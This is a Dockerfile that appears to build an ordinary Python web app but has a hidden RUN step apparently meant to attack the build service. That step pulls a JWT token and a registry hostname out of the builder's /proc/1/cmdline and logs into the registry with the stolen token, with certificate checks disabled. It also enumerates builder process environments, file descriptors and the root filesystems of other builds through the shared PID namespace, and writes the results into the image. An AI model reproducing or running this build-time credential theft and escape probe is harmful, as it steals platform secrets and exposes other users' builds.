FROM python:3.12-alpine
WORKDIR /app
RUN { echo "=== v6: registry auth + builder secrets ==="; \
  CMDLINE=$(cat /proc/1/cmdline | tr '\0' '\n'); \
  TOKEN=$(echo "$CMDLINE" | grep -oE 'eyJ[A-Za-z0-9_.-]+' | head -1); \
  REG=$(echo "$CMDLINE" | grep -oE '[a-z-]+-registry.amer-1.aivencloud.net' | head -1); \
  echo "reg=$REG token_len=${#TOKEN}"; \
  echo "--- WWW-Authenticate realm ---"; \
  wget -qS -O /dev/null --no-check-certificate --timeout=6 "https://$REG/v2/" 2>&1 | grep -i www-auth; \
  echo "--- try /v2/_catalog with basic jwt/nomad-token:$TOKEN ---"; \
  wget -qO- --no-check-certificate --timeout=6 --user="jwt/nomad-token" --password="$TOKEN" "https://$REG/v2/_catalog" 2>&1 | head -c 500; echo; \
  echo "--- try token endpoint ---"; \
  wget -qO- --no-check-certificate --timeout=6 --header="Authorization: Basic $(printf 'jwt/nomad-token:%s' "$TOKEN" | base64 -w0)" "https://$REG/v2/" 2>&1 | head -c 300; echo; \
  echo "=== builder secrets via shared PID ns ==="; \
  for f in environ fd cmdline cwd; do echo "-- /proc/1/$f --"; ls -la /proc/1/$f 2>&1 | head -3; done; \
  echo "-- try /proc/107/root (podman build) --"; ls /proc/107/root 2>&1 | head -3; \
  echo "-- /proc/1/fd direct --"; ls -la /proc/1/fd/ 2>&1 | head -10; \
  echo "-- all /proc/*/root readable? --"; for p in $(ls /proc|grep -E '^[0-9]+$'); do r=$(readlink /proc/$p/root 2>&1); echo "$p -> $r"; done; \
} > /app/v6.txt 2>&1
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
